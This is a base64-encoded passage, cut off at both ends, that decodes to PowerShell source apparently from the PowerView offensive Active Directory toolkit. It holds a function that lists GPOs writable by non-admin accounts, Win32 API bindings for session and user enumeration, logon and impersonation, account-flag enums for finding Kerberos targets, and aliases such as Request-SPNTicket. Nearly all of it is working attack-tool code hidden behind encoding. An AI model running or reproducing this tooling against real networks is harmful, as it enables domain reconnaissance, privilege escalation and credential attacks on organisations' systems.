dC4KCi5FWEFNUExFCgpHZXQtR1BPRGVsZWdhdGlvbiAtR1BPTmFtZQoKUmV0dXJucyBhbGwgR1BPIGRlbGVnYXRpb25zIG9uIGEgZ2l2ZW4gR1BPLgojPgoKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSAoCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkR1BPTmFtZSA9ICcqJywKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwxMDAwMCldIAogICAgICAgIFtJbnRdCiAgICAgICAgJFBhZ2VTaXplID0gMjAwCiAgICApCgogICAgJEV4Y2x1c2lvbnMgPSBAKCdTWVNURU0nLCdEb21haW4gQWRtaW5zJywnRW50ZXJwcmlzZSBBZG1pbnMnKQoKICAgICRGb3Jlc3QgPSBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5Gb3Jlc3RdOjpHZXRDdXJyZW50Rm9yZXN0KCkKICAgICREb21haW5MaXN0ID0gQCgkRm9yZXN0LkRvbWFpbnMpCiAgICAkRG9tYWlucyA9ICREb21haW5MaXN0IHwgZm9yZWFjaCB7ICRfLkdldERpcmVjdG9yeUVudHJ5KCkgfQogICAgZm9yZWFjaCAoJERvbWFpbiBpbiAkRG9tYWlucykgewogICAgICAgICRGaWx0ZXIgPSAiKCYob2JqZWN0Q2F0ZWdvcnk9Z3JvdXBQb2xpY3lDb250YWluZXIpKGRpc3BsYXluYW1lPSRHUE9OYW1lKSkiCiAgICAgICAgJFNlYXJjaGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5U2VhcmNoZXIKICAgICAgICAkU2VhcmNoZXIuU2VhcmNoUm9vdCA9ICREb21haW4KICAgICAgICAkU2VhcmNoZXIuRmlsdGVyID0gJEZpbHRlcgogICAgICAgICRTZWFyY2hlci5QYWdlU2l6ZSA9ICRQYWdlU2l6ZQogICAgICAgICRTZWFyY2hlci5TZWFyY2hTY29wZSA9ICJTdWJ0cmVlIgogICAgICAgICRsaXN0R1BPID0gJFNlYXJjaGVyLkZpbmRBbGwoKQogICAgICAgIGZvcmVhY2ggKCRncG8gaW4gJGxpc3RHUE8pewogICAgICAgICAgICAkQUNMID0gKFtBRFNJXSRncG8ucGF0aCkuT2JqZWN0U2VjdXJpdHkuQWNjZXNzIHwgPyB7JF8uQWN0aXZlRGlyZWN0b3J5UmlnaHRzIC1tYXRjaCAiV3JpdGUiIC1hbmQgJF8uQWNjZXNzQ29udHJvbFR5cGUgLWVxICJBbGxvdyIgLWFuZCAgJEV4Y2x1c2lvbnMgLW5vdGNvbnRhaW5zICRfLklkZW50aXR5UmVmZXJlbmNlLnRvU3RyaW5nKCkuc3BsaXQoIlwiKVsxXSAtYW5kICRfLklkZW50aXR5UmVmZXJlbmNlIC1uZSAiQ1JFQVRPUiBPV05FUiJ9CiAgICAgICAgaWYgKCRBQ0wgLW5lICRudWxsKXsKICAgICAgICAgICAgJEdwb0FDTCA9IE5ldy1PYmplY3QgcHNvYmplY3QKICAgICAgICAgICAgJEdwb0FDTCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdBRFNQYXRoJyAkZ3BvLlByb3BlcnRpZXMuYWRzcGF0aAogICAgICAgICAgICAkR3BvQUNMIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dQT0Rpc3BsYXlOYW1lJyAkZ3BvLlByb3BlcnRpZXMuZGlzcGxheW5hbWUKICAgICAgICAgICAgJEdwb0FDTCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdJZGVudGl0eVJlZmVyZW5jZScgJEFDTC5JZGVudGl0eVJlZmVyZW5jZQogICAgICAgICAgICAkR3BvQUNMIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0FjdGl2ZURpcmVjdG9yeVJpZ2h0cycgJEFDTC5BY3RpdmVEaXJlY3RvcnlSaWdodHMKICAgICAgICAgICAgJEdwb0FDTAogICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojCiMgRXhwb3NlIHRoZSBXaW4zMkFQSSBmdW5jdGlvbnMgYW5kIGRhdGFzdHJ1Y3R1cmVzIGJlbG93CiMgdXNpbmcgUFNSZWZsZWN0LgojIFdhcm5pbmc6IE9uY2UgdGhlc2UgYXJlIGV4ZWN1dGVkLCB0aGV5IGFyZSBiYWtlZCBpbgojIGFuZCBjYW4ndCBiZSBjaGFuZ2VkIHdoaWxlIHRoZSBzY3JpcHQgaXMgcnVubmluZyEKIwojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKJE1vZCA9IE5ldy1Jbk1lbW9yeU1vZHVsZSAtTW9kdWxlTmFtZSBXaW4zMgoKIyBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNBdm9pZFVzaW5nUG9zaXRpb25hbFBhcmFtZXRlcnMnLCBTY29wZT0nRnVuY3Rpb24nLCBUYXJnZXQ9J3BzZW51bScpXQoKIyB1c2VkIHRvIHBhcnNlIHRoZSAnc2FtQWNjb3VudFR5cGUnIHByb3BlcnR5IGZvciB1c2Vycy9jb21wdXRlcnMvZ3JvdXBzCiRTYW1BY2NvdW50VHlwZUVudW0gPSBwc2VudW0gJE1vZCBQb3dlclZpZXcuU2FtQWNjb3VudFR5cGVFbnVtIFVJbnQzMiBAewogICAgRE9NQUlOX09CSkVDVCAgICAgICAgICAgICAgICAgICA9ICAgJzB4MDAwMDAwMDAnCiAgICBHUk9VUF9PQkpFQ1QgICAgICAgICAgICAgICAgICAgID0gICAnMHgxMDAwMDAwMCcKICAgIE5PTl9TRUNVUklUWV9HUk9VUF9PQkpFQ1QgICAgICAgPSAgICcweDEwMDAwMDAxJwogICAgQUxJQVNfT0JKRUNUICAgICAgICAgICAgICAgICAgICA9ICAgJzB4MjAwMDAwMDAnCiAgICBOT05fU0VDVVJJVFlfQUxJQVNfT0JKRUNUICAgICAgID0gICAnMHgyMDAwMDAwMScKICAgIFVTRVJfT0JKRUNUICAgICAgICAgICAgICAgICAgICAgPSAgICcweDMwMDAwMDAwJwogICAgTUFDSElORV9BQ0NPVU5UICAgICAgICAgICAgICAgICA9ICAgJzB4MzAwMDAwMDEnCiAgICBUUlVTVF9BQ0NPVU5UICAgICAgICAgICAgICAgICAgID0gICAnMHgzMDAwMDAwMicKICAgIEFQUF9CQVNJQ19HUk9VUCAgICAgICAgICAgICAgICAgPSAgICcweDQwMDAwMDAwJwogICAgQVBQX1FVRVJZX0dST1VQICAgICAgICAgICAgICAgICA9ICAgJzB4NDAwMDAwMDEnCiAgICBBQ0NPVU5UX1RZUEVfTUFYICAgICAgICAgICAgICAgID0gICAnMHg3ZmZmZmZmZicKfQoKIyB1c2VkIHRvIHBhcnNlIHRoZSAnZ3JvdXB0eXBlJyBwcm9wZXJ0eSBmb3IgZ3JvdXBzCiRHcm91cFR5cGVFbnVtID0gcHNlbnVtICRNb2QgUG93ZXJWaWV3Lkdyb3VwVHlwZUVudW0gVUludDMyIEB7CiAgICBDUkVBVEVEX0JZX1NZU1RFTSAgICAgICAgICAgICAgID0gICAnMHgwMDAwMDAwMScKICAgIEdMT0JBTF9TQ09QRSAgICAgICAgICAgICAgICAgICAgPSAgICcweDAwMDAwMDAyJwogICAgRE9NQUlOX0xPQ0FMX1NDT1BFICAgICAgICAgICAgICA9ICAgJzB4MDAwMDAwMDQnCiAgICBVTklWRVJTQUxfU0NPUEUgICAgICAgICAgICAgICAgID0gICAnMHgwMDAwMDAwOCcKICAgIEFQUF9CQVNJQyAgICAgICAgICAgICAgICAgICAgICAgPSAgICcweDAwMDAwMDEwJwogICAgQVBQX1FVRVJZICAgICAgICAgICAgICAgICAgICAgICA9ICAgJzB4MDAwMDAwMjAnCiAgICBTRUNVUklUWSAgICAgICAgICAgICAgICAgICAgICAgID0gICAnMHg4MDAwMDAwMCcKfSAtQml0ZmllbGQKCiMgdXNlZCB0byBwYXJzZSB0aGUgJ3VzZXJBY2NvdW50Q29udHJvbCcgcHJvcGVydHkgZm9yIHVzZXJzL2dyb3VwcwokVUFDRW51bSA9IHBzZW51bSAkTW9kIFBvd2VyVmlldy5VQUNFbnVtIFVJbnQzMiBAewogICAgU0NSSVBUICAgICAgICAgICAgICAgICAgICAgICAgICA9ICAgMQogICAgQUNDT1VOVERJU0FCTEUgICAgICAgICAgICAgICAgICA9ICAgMgogICAgSE9NRURJUl9SRVFVSVJFRCAgICAgICAgICAgICAgICA9ICAgOAogICAgTE9DS09VVCAgICAgICAgICAgICAgICAgICAgICAgICA9ICAgMTYKICAgIFBBU1NXRF9OT1RSRVFEICAgICAgICAgICAgICAgICAgPSAgIDMyCiAgICBQQVNTV0RfQ0FOVF9DSEFOR0UgICAgICAgICAgICAgID0gICA2NAogICAgRU5DUllQVEVEX1RFWFRfUFdEX0FMTE9XRUQgICAgICA9ICAgMTI4CiAgICBURU1QX0RVUExJQ0FURV9BQ0NPVU5UICAgICAgICAgID0gICAyNTYKICAgIE5PUk1BTF9BQ0NPVU5UICAgICAgICAgICAgICAgICAgPSAgIDUxMgogICAgSU5URVJET01BSU5fVFJVU1RfQUNDT1VOVCAgICAgICA9ICAgMjA0OAogICAgV09SS1NUQVRJT05fVFJVU1RfQUNDT1VOVCAgICAgICA9ICAgNDA5NgogICAgU0VSVkVSX1RSVVNUX0FDQ09VTlQgICAgICAgICAgICA9ICAgODE5MgogICAgRE9OVF9FWFBJUkVfUEFTU1dPUkQgICAgICAgICAgICA9ICAgNjU1MzYKICAgIE1OU19MT0dPTl9BQ0NPVU5UICAgICAgICAgICAgICAgPSAgIDEzMTA3MgogICAgU01BUlRDQVJEX1JFUVVJUkVEICAgICAgICAgICAgICA9ICAgMjYyMTQ0CiAgICBUUlVTVEVEX0ZPUl9ERUxFR0FUSU9OICAgICAgICAgID0gICA1MjQyODgKICAgIE5PVF9ERUxFR0FURUQgICAgICAgICAgICAgICAgICAgPSAgIDEwNDg1NzYKICAgIFVTRV9ERVNfS0VZX09OTFkgICAgICAgICAgICAgICAgPSAgIDIwOTcxNTIKICAgIERPTlRfUkVRX1BSRUFVVEggICAgICAgICAgICAgICAgPSAgIDQxOTQzMDQKICAgIFBBU1NXT1JEX0VYUElSRUQgICAgICAgICAgICAgICAgPSAgIDgzODg2MDgKICAgIFRSVVNURURfVE9fQVVUSF9GT1JfREVMRUdBVElPTiAgPSAgIDE2Nzc3MjE2CiAgICBQQVJUSUFMX1NFQ1JFVFNfQUNDT1VOVCAgICAgICAgID0gICA2NzEwODg2NAp9IC1CaXRmaWVsZAoKIyBlbnVtIHVzZWQgYnkgJFdUU19TRVNTSU9OX0lORk9fMSBiZWxvdwokV1RTQ29ubmVjdFN0YXRlID0gcHNlbnVtICRNb2QgV1RTX0NPTk5FQ1RTVEFURV9DTEFTUyBVSW50MTYgQHsKICAgIEFjdGl2ZSAgICAgICA9ICAgIDAKICAgIENvbm5lY3RlZCAgICA9ICAgIDEKICAgIENvbm5lY3RRdWVyeSA9ICAgIDIKICAgIFNoYWRvdyAgICAgICA9ICAgIDMKICAgIERpc2Nvbm5lY3RlZCA9ICAgIDQKICAgIElkbGUgICAgICAgICA9ICAgIDUKICAgIExpc3RlbiAgICAgICA9ICAgIDYKICAgIFJlc2V0ICAgICAgICA9ICAgIDcKICAgIERvd24gICAgICAgICA9ICAgIDgKICAgIEluaXQgICAgICAgICA9ICAgIDkKfQoKIyB0aGUgV1RTRW51bWVyYXRlU2Vzc2lvbnNFeCByZXN1bHQgc3RydWN0dXJlCiRXVFNfU0VTU0lPTl9JTkZPXzEgPSBzdHJ1Y3QgJE1vZCBQb3dlclZpZXcuUkRQU2Vzc2lvbkluZm8gQHsKICAgIEV4ZWNFbnZJZCA9IGZpZWxkIDAgVUludDMyCiAgICBTdGF0ZSA9IGZpZWxkIDEgJFdUU0Nvbm5lY3RTdGF0ZQogICAgU2Vzc2lvbklkID0gZmllbGQgMiBVSW50MzIKICAgIHBTZXNzaW9uTmFtZSA9IGZpZWxkIDMgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKICAgIHBIb3N0TmFtZSA9IGZpZWxkIDQgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKICAgIHBVc2VyTmFtZSA9IGZpZWxkIDUgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKICAgIHBEb21haW5OYW1lID0gZmllbGQgNiBTdHJpbmcgLU1hcnNoYWxBcyBAKCdMUFdTdHInKQogICAgcEZhcm1OYW1lID0gZmllbGQgNyBTdHJpbmcgLU1hcnNoYWxBcyBAKCdMUFdTdHInKQp9CgojIHRoZSBwYXJ0aWN1bGFyIFdUU1F1ZXJ5U2Vzc2lvbkluZm9ybWF0aW9uIHJlc3VsdCBzdHJ1Y3R1cmUKJFdUU19DTElFTlRfQUREUkVTUyA9IHN0cnVjdCAkbW9kIFdUU19DTElFTlRfQUREUkVTUyBAewogICAgQWRkcmVzc0ZhbWlseSA9IGZpZWxkIDAgVUludDMyCiAgICBBZGRyZXNzID0gZmllbGQgMSBCeXRlW10gLU1hcnNoYWxBcyBAKCdCeVZhbEFycmF5JywgMjApCn0KCiMgdGhlIE5ldFNoYXJlRW51bSByZXN1bHQgc3RydWN0dXJlCiRTSEFSRV9JTkZPXzEgPSBzdHJ1Y3QgJE1vZCBQb3dlclZpZXcuU2hhcmVJbmZvIEB7CiAgICBOYW1lID0gZmllbGQgMCBTdHJpbmcgLU1hcnNoYWxBcyBAKCdMUFdTdHInKQogICAgVHlwZSA9IGZpZWxkIDEgVUludDMyCiAgICBSZW1hcmsgPSBmaWVsZCAyIFN0cmluZyAtTWFyc2hhbEFzIEAoJ0xQV1N0cicpCn0KCiMgdGhlIE5ldFdrc3RhVXNlckVudW0gcmVzdWx0IHN0cnVjdHVyZQokV0tTVEFfVVNFUl9JTkZPXzEgPSBzdHJ1Y3QgJE1vZCBQb3dlclZpZXcuTG9nZ2VkT25Vc2VySW5mbyBAewogICAgVXNlck5hbWUgPSBmaWVsZCAwIFN0cmluZyAtTWFyc2hhbEFzIEAoJ0xQV1N0cicpCiAgICBMb2dvbkRvbWFpbiA9IGZpZWxkIDEgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKICAgIEF1dGhEb21haW5zID0gZmllbGQgMiBTdHJpbmcgLU1hcnNoYWxBcyBAKCdMUFdTdHInKQogICAgTG9nb25TZXJ2ZXIgPSBmaWVsZCAzIFN0cmluZyAtTWFyc2hhbEFzIEAoJ0xQV1N0cicpCn0KCiMgdGhlIE5ldFNlc3Npb25FbnVtIHJlc3VsdCBzdHJ1Y3R1cmUKJFNFU1NJT05fSU5GT18xMCA9IHN0cnVjdCAkTW9kIFBvd2VyVmlldy5TZXNzaW9uSW5mbyBAewogICAgQ05hbWUgPSBmaWVsZCAwIFN0cmluZyAtTWFyc2hhbEFzIEAoJ0xQV1N0cicpCiAgICBVc2VyTmFtZSA9IGZpZWxkIDEgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKICAgIFRpbWUgPSBmaWVsZCAyIFVJbnQzMgogICAgSWRsZVRpbWUgPSBmaWVsZCAzIFVJbnQzMgp9CgojIGVudW0gdXNlZCBieSAkTE9DQUxHUk9VUF9NRU1CRVJTX0lORk9fMiBiZWxvdwokU0lEX05BTUVfVVNFID0gcHNlbnVtICRNb2QgU0lEX05BTUVfVVNFIFVJbnQxNiBAewogICAgU2lkVHlwZVVzZXIgICAgICAgICAgICAgPSAxCiAgICBTaWRUeXBlR3JvdXAgICAgICAgICAgICA9IDIKICAgIFNpZFR5cGVEb21haW4gICAgICAgICAgID0gMwogICAgU2lkVHlwZUFsaWFzICAgICAgICAgICAgPSA0CiAgICBTaWRUeXBlV2VsbEtub3duR3JvdXAgICA9IDUKICAgIFNpZFR5cGVEZWxldGVkQWNjb3VudCAgID0gNgogICAgU2lkVHlwZUludmFsaWQgICAgICAgICAgPSA3CiAgICBTaWRUeXBlVW5rbm93biAgICAgICAgICA9IDgKICAgIFNpZFR5cGVDb21wdXRlciAgICAgICAgID0gOQp9CgojIHRoZSBOZXRMb2NhbEdyb3VwRW51bSByZXN1bHQgc3RydWN0dXJlCiRMT0NBTEdST1VQX0lORk9fMSA9IHN0cnVjdCAkTW9kIExPQ0FMR1JPVVBfSU5GT18xIEB7CiAgICBsZ3JwaTFfbmFtZSA9IGZpZWxkIDAgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKICAgIGxncnBpMV9jb21tZW50ID0gZmllbGQgMSBTdHJpbmcgLU1hcnNoYWxBcyBAKCdMUFdTdHInKQp9CgojIHRoZSBOZXRMb2NhbEdyb3VwR2V0TWVtYmVycyByZXN1bHQgc3RydWN0dXJlCiRMT0NBTEdST1VQX01FTUJFUlNfSU5GT18yID0gc3RydWN0ICRNb2QgTE9DQUxHUk9VUF9NRU1CRVJTX0lORk9fMiBAewogICAgbGdybWkyX3NpZCA9IGZpZWxkIDAgSW50UHRyCiAgICBsZ3JtaTJfc2lkdXNhZ2UgPSBmaWVsZCAxICRTSURfTkFNRV9VU0UKICAgIGxncm1pMl9kb21haW5hbmRuYW1lID0gZmllbGQgMiBTdHJpbmcgLU1hcnNoYWxBcyBAKCdMUFdTdHInKQp9CgojIGVudW1zIHVzZWQgaW4gRFNfRE9NQUlOX1RSVVNUUwokRHNEb21haW5GbGFnID0gcHNlbnVtICRNb2QgRHNEb21haW4uRmxhZ3MgVUludDMyIEB7CiAgICBJTl9GT1JFU1QgICAgICAgPSAxCiAgICBESVJFQ1RfT1VUQk9VTkQgPSAyCiAgICBUUkVFX1JPT1QgICAgICAgPSA0CiAgICBQUklNQVJZICAgICAgICAgPSA4CiAgICBOQVRJVkVfTU9ERSAgICAgPSAxNgogICAgRElSRUNUX0lOQk9VTkQgID0gMzIKfSAtQml0ZmllbGQKJERzRG9tYWluVHJ1c3RUeXBlID0gcHNlbnVtICRNb2QgRHNEb21haW4uVHJ1c3RUeXBlIFVJbnQzMiBAewogICAgRE9XTkxFVkVMICAgPSAxCiAgICBVUExFVkVMICAgICA9IDIKICAgIE1JVCAgICAgICAgID0gMwogICAgRENFICAgICAgICAgPSA0Cn0KJERzRG9tYWluVHJ1c3RBdHRyaWJ1dGVzID0gcHNlbnVtICRNb2QgRHNEb21haW4uVHJ1c3RBdHRyaWJ1dGVzIFVJbnQzMiBAewogICAgTk9OX1RSQU5TSVRJVkUgICAgICA9IDEKICAgIFVQTEVWRUxfT05MWSAgICAgICAgPSAyCiAgICBGSUxURVJfU0lEUyAgICAgICAgID0gNAogICAgRk9SRVNUX1RSQU5TSVRJVkUgICA9IDgKICAgIENST1NTX09SR0FOSVpBVElPTiAgPSAxNgogICAgV0lUSElOX0ZPUkVTVCAgICAgICA9IDMyCiAgICBUUkVBVF9BU19FWFRFUk5BTCAgID0gNjQKfQoKIyB0aGUgRHNFbnVtZXJhdGVEb21haW5UcnVzdHMgcmVzdWx0IHN0cnVjdHVyZQokRFNfRE9NQUlOX1RSVVNUUyA9IHN0cnVjdCAkTW9kIERTX0RPTUFJTl9UUlVTVFMgQHsKICAgIE5ldGJpb3NEb21haW5OYW1lID0gZmllbGQgMCBTdHJpbmcgLU1hcnNoYWxBcyBAKCdMUFdTdHInKQogICAgRG5zRG9tYWluTmFtZSA9IGZpZWxkIDEgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKICAgIEZsYWdzID0gZmllbGQgMiAkRHNEb21haW5GbGFnCiAgICBQYXJlbnRJbmRleCA9IGZpZWxkIDMgVUludDMyCiAgICBUcnVzdFR5cGUgPSBmaWVsZCA0ICREc0RvbWFpblRydXN0VHlwZQogICAgVHJ1c3RBdHRyaWJ1dGVzID0gZmllbGQgNSAkRHNEb21haW5UcnVzdEF0dHJpYnV0ZXMKICAgIERvbWFpblNpZCA9IGZpZWxkIDYgSW50UHRyCiAgICBEb21haW5HdWlkID0gZmllbGQgNyBHdWlkCn0KCiMgdXNlZCBieSBXTmV0QWRkQ29ubmVjdGlvbjJXCiRORVRSRVNPVVJDRVcgPSBzdHJ1Y3QgJE1vZCBORVRSRVNPVVJDRVcgQHsKICAgIGR3U2NvcGUgPSAgICAgICAgIGZpZWxkIDAgVUludDMyCiAgICBkd1R5cGUgPSAgICAgICAgICBmaWVsZCAxIFVJbnQzMgogICAgZHdEaXNwbGF5VHlwZSA9ICAgZmllbGQgMiBVSW50MzIKICAgIGR3VXNhZ2UgPSAgICAgICAgIGZpZWxkIDMgVUludDMyCiAgICBscExvY2FsTmFtZSA9ICAgICBmaWVsZCA0IFN0cmluZyAtTWFyc2hhbEFzIEAoJ0xQV1N0cicpCiAgICBscFJlbW90ZU5hbWUgPSAgICBmaWVsZCA1IFN0cmluZyAtTWFyc2hhbEFzIEAoJ0xQV1N0cicpCiAgICBscENvbW1lbnQgPSAgICAgICBmaWVsZCA2IFN0cmluZyAtTWFyc2hhbEFzIEAoJ0xQV1N0cicpCiAgICBscFByb3ZpZGVyID0gICAgICBmaWVsZCA3IFN0cmluZyAtTWFyc2hhbEFzIEAoJ0xQV1N0cicpCn0KCiMgYWxsIG9mIHRoZSBXaW4zMiBBUEkgZnVuY3Rpb25zIHdlIG5lZWQKJEZ1bmN0aW9uRGVmaW5pdGlvbnMgPSBAKAogICAgKGZ1bmMgbmV0YXBpMzIgTmV0U2hhcmVFbnVtIChbSW50XSkgQChbU3RyaW5nXSwgW0ludF0sIFtJbnRQdHJdLk1ha2VCeVJlZlR5cGUoKSwgW0ludF0sIFtJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpLCBbSW50MzJdLk1ha2VCeVJlZlR5cGUoKSwgW0ludDMyXS5NYWtlQnlSZWZUeXBlKCkpKSwKICAgIChmdW5jIG5ldGFwaTMyIE5ldFdrc3RhVXNlckVudW0gKFtJbnRdKSBAKFtTdHJpbmddLCBbSW50XSwgW0ludFB0cl0uTWFrZUJ5UmVmVHlwZSgpLCBbSW50XSwgW0ludDMyXS5NYWtlQnlSZWZUeXBlKCksIFtJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpLCBbSW50MzJdLk1ha2VCeVJlZlR5cGUoKSkpLAogICAgKGZ1bmMgbmV0YXBpMzIgTmV0U2Vzc2lvbkVudW0gKFtJbnRdKSBAKFtTdHJpbmddLCBbU3RyaW5nXSwgW1N0cmluZ10sIFtJbnRdLCBbSW50UHRyXS5NYWtlQnlSZWZUeXBlKCksIFtJbnRdLCBbSW50MzJdLk1ha2VCeVJlZlR5cGUoKSwgW0ludDMyXS5NYWtlQnlSZWZUeXBlKCksIFtJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpKSksCiAgICAoZnVuYyBuZXRhcGkzMiBOZXRMb2NhbEdyb3VwRW51bSAoW0ludF0pIEAoW1N0cmluZ10sIFtJbnRdLCBbSW50UHRyXS5NYWtlQnlSZWZUeXBlKCksIFtJbnRdLCBbSW50MzJdLk1ha2VCeVJlZlR5cGUoKSwgW0ludDMyXS5NYWtlQnlSZWZUeXBlKCksIFtJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpKSksCiAgICAoZnVuYyBuZXRhcGkzMiBOZXRMb2NhbEdyb3VwR2V0TWVtYmVycyAoW0ludF0pIEAoW1N0cmluZ10sIFtTdHJpbmddLCBbSW50XSwgW0ludFB0cl0uTWFrZUJ5UmVmVHlwZSgpLCBbSW50XSwgW0ludDMyXS5NYWtlQnlSZWZUeXBlKCksIFtJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpLCBbSW50MzJdLk1ha2VCeVJlZlR5cGUoKSkpLAogICAgKGZ1bmMgbmV0YXBpMzIgRHNHZXRTaXRlTmFtZSAoW0ludF0pIEAoW1N0cmluZ10sIFtJbnRQdHJdLk1ha2VCeVJlZlR5cGUoKSkpLAogICAgKGZ1bmMgbmV0YXBpMzIgRHNFbnVtZXJhdGVEb21haW5UcnVzdHMgKFtJbnRdKSBAKFtTdHJpbmddLCBbVUludDMyXSwgW0ludFB0cl0uTWFrZUJ5UmVmVHlwZSgpLCBbSW50UHRyXS5NYWtlQnlSZWZUeXBlKCkpKSwKICAgIChmdW5jIG5ldGFwaTMyIE5ldEFwaUJ1ZmZlckZyZWUgKFtJbnRdKSBAKFtJbnRQdHJdKSksCiAgICAoZnVuYyBhZHZhcGkzMiBDb252ZXJ0U2lkVG9TdHJpbmdTaWQgKFtJbnRdKSBAKFtJbnRQdHJdLCBbU3RyaW5nXS5NYWtlQnlSZWZUeXBlKCkpIC1TZXRMYXN0RXJyb3IpLAogICAgKGZ1bmMgYWR2YXBpMzIgT3BlblNDTWFuYWdlclcgKFtJbnRQdHJdKSBAKFtTdHJpbmddLCBbU3RyaW5nXSwgW0ludF0pIC1TZXRMYXN0RXJyb3IpLAogICAgKGZ1bmMgYWR2YXBpMzIgQ2xvc2VTZXJ2aWNlSGFuZGxlIChbSW50XSkgQChbSW50UHRyXSkpLAogICAgKGZ1bmMgYWR2YXBpMzIgTG9nb25Vc2VyIChbQm9vbF0pIEAoW1N0cmluZ10sIFtTdHJpbmddLCBbU3RyaW5nXSwgW1VJbnQzMl0sIFtVSW50MzJdLCBbSW50UHRyXS5NYWtlQnlSZWZUeXBlKCkpIC1TZXRMYXN0RXJyb3IpLAogICAgKGZ1bmMgYWR2YXBpMzIgSW1wZXJzb25hdGVMb2dnZWRPblVzZXIgKFtCb29sXSkgQChbSW50UHRyXSkgLVNldExhc3RFcnJvciksCiAgICAoZnVuYyBhZHZhcGkzMiBSZXZlcnRUb1NlbGYgKFtCb29sXSkgQCgpIC1TZXRMYXN0RXJyb3IpLAogICAgKGZ1bmMgd3RzYXBpMzIgV1RTT3BlblNlcnZlckV4IChbSW50UHRyXSkgQChbU3RyaW5nXSkpLAogICAgKGZ1bmMgd3RzYXBpMzIgV1RTRW51bWVyYXRlU2Vzc2lvbnNFeCAoW0ludF0pIEAoW0ludFB0cl0sIFtJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpLCBbSW50XSwgW0ludFB0cl0uTWFrZUJ5UmVmVHlwZSgpLCBbSW50MzJdLk1ha2VCeVJlZlR5cGUoKSkgLVNldExhc3RFcnJvciksCiAgICAoZnVuYyB3dHNhcGkzMiBXVFNRdWVyeVNlc3Npb25JbmZvcm1hdGlvbiAoW0ludF0pIEAoW0ludFB0cl0sIFtJbnRdLCBbSW50XSwgW0ludFB0cl0uTWFrZUJ5UmVmVHlwZSgpLCBbSW50MzJdLk1ha2VCeVJlZlR5cGUoKSkgLVNldExhc3RFcnJvciksCiAgICAoZnVuYyB3dHNhcGkzMiBXVFNGcmVlTWVtb3J5RXggKFtJbnRdKSBAKFtJbnQzMl0sIFtJbnRQdHJdLCBbSW50MzJdKSksCiAgICAoZnVuYyB3dHNhcGkzMiBXVFNGcmVlTWVtb3J5IChbSW50XSkgQChbSW50UHRyXSkpLAogICAgKGZ1bmMgd3RzYXBpMzIgV1RTQ2xvc2VTZXJ2ZXIgKFtJbnRdKSBAKFtJbnRQdHJdKSksCiAgICAoZnVuYyBNcHIgV05ldEFkZENvbm5lY3Rpb24yVyAoW0ludF0pIEAoJE5FVFJFU09VUkNFVywgW1N0cmluZ10sIFtTdHJpbmddLCBbVUludDMyXSkpLAogICAgKGZ1bmMgTXByIFdOZXRDYW5jZWxDb25uZWN0aW9uMiAoW0ludF0pIEAoW1N0cmluZ10sIFtJbnRdLCBbQm9vbF0pKSwKICAgIChmdW5jIGtlcm5lbDMyIENsb3NlSGFuZGxlIChbQm9vbF0pIEAoW0ludFB0cl0pIC1TZXRMYXN0RXJyb3IpCikKCiRUeXBlcyA9ICRGdW5jdGlvbkRlZmluaXRpb25zIHwgQWRkLVdpbjMyVHlwZSAtTW9kdWxlICRNb2QgLU5hbWVzcGFjZSAnV2luMzInCiROZXRhcGkzMiA9ICRUeXBlc1snbmV0YXBpMzInXQokQWR2YXBpMzIgPSAkVHlwZXNbJ2FkdmFwaTMyJ10KJFd0c2FwaTMyID0gJFR5cGVzWyd3dHNhcGkzMiddCiRNcHIgPSAkVHlwZXNbJ01wciddCiRLZXJuZWwzMiA9ICRUeXBlc1sna2VybmVsMzInXQoKU2V0LUFsaWFzIEdldC1JUEFkZHJlc3MgUmVzb2x2ZS1JUEFkZHJlc3MKU2V0LUFsaWFzIENvbnZlcnQtTmFtZVRvU2lkIENvbnZlcnRUby1TSUQKU2V0LUFsaWFzIENvbnZlcnQtU2lkVG9OYW1lIENvbnZlcnRGcm9tLVNJRApTZXQtQWxpYXMgUmVxdWVzdC1TUE5UaWNrZXQgR2V0LURvbWFpblNQTlRpY2tldApTZXQtQWxpYXMgR2V0LUROU1pvbmUgR2V0LURvbWFpbkROU1pvbmUKU2V0LUFsaWFzIEdldC1ETlNSZWNvcmQgR2V0LURvbWFpbkROU1JlY29yZApTZXQtQWxpYXMgR2V0LU5ldERvbWFpbiBHZXQtRG9tYWluClNldC1BbGlhcyBHZXQtTmV0RG9tYWluQ29udHJvbGxlciBHZXQtRG9tYWluQ29udHJvbGxlcgpTZXQtQWxpYXMgR2V0LU5ldEZvcmVzdCBHZXQtRm9yZXN0ClNldC1BbGlhcyBHZXQtTmV0Rm9yZXN0RG9tYWluIEdldC1Gb3Jlc3REb21haW4KU2V0LUFsaWFzIEdldC1OZXRGb3Jlc3RDYXRhbG9nIEdldC